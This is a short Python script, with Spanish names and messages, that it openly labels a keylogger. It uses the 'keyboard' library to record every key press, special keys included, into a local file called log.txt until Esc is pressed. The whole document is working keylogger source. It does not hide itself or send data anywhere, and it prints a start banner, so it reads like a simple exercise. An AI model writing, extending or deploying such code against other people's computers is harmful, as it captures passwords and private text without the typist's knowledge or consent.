import keyboard

archivo_log = "log.txt"

def capturar_tecla(evento):
    f = open(archivo_log, "a", encoding="utf-8")
    try:
        if evento.name == "space":
            print(" ", file=f, end="")
        elif len(evento.name) > 1:
            print(f" [{evento.name.upper()}] ", file=f, end="")
        else:
            print(evento.name, file=f, end="")
    finally:
        f.close()

print("--- KEYLOGGER INICIADO ---")

keyboard.on_press(capturar_tecla)
keyboard.wait("esc")

print("\n PROGRAMA FINALIZADO ")